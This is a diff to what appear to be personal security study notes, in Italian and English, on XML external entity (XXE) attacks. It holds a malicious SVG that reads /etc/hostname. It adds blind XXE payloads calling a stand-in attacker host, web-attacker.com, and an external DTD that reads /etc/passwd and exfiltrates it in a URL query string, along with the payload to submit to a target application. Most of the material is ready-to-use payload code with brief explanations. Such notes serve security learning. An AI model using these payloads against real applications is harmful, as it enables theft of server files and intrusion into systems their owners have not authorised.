@@ -78,4 +78,48 @@ XXE VIA FILE UPLOAD
 Examples of XML-based formats are office document formats like DOCX and image formats like SVG.
 
 esempio di file SVG malevolo
-<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>        
+<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg> 
+
+BLIND XXE 
+exploitabile con out-of-band interactions e triggerando XML parsing errors
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
+
+alcune volte potrebbero essere filtrati allora si usano altri parametri come myparameterentity
+<!ENTITY % myparameterentity "my parameter entity value" >
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
+
+
+exfiltrate data
+richiesto che l'attacker hosti un DTD malevolo che può essere richiamato dall'xml
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
+%eval;
+%exfiltrate;
+
+This DTD carries out the following steps:
+        
+Defines an XML parameter entity called file, containing the contents of the /etc/passwd file.        
+Defines an XML parameter entity called eval, containing a dynamic declaration of another XML parameter entity called exfiltrate. The exfiltrate entity will be evaluated by making an HTTP request to the attacker's web server containing the value of the file entity within the URL query string.
+Uses the eval entity, which causes the dynamic declaration of the exfiltrate entity to be performed.
+Uses the exfiltrate entity, so that its value is evaluated by requesting the specified URL.
+
+attacker host -> http://web-attacker.com/malicious.dtd
+
+payload da submittare all'applicazione -> 
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
+
+
+            
+Note:          
+
+This technique might not work with some file contents, including the newline characters contained in the /etc/passwd
+file. This is because some XML parsers fetch the URL in the external 
+entity definition using an API that validates the characters that are 
+allowed to appear within the URL. In this situation, it might be 
+possible to use the FTP protocol instead of HTTP. Sometimes, it will not
+be possible to exfiltrate data containing newline characters, and so a 
+file such as /etc/hostname can be targeted instead.
+            
+
+        
+            
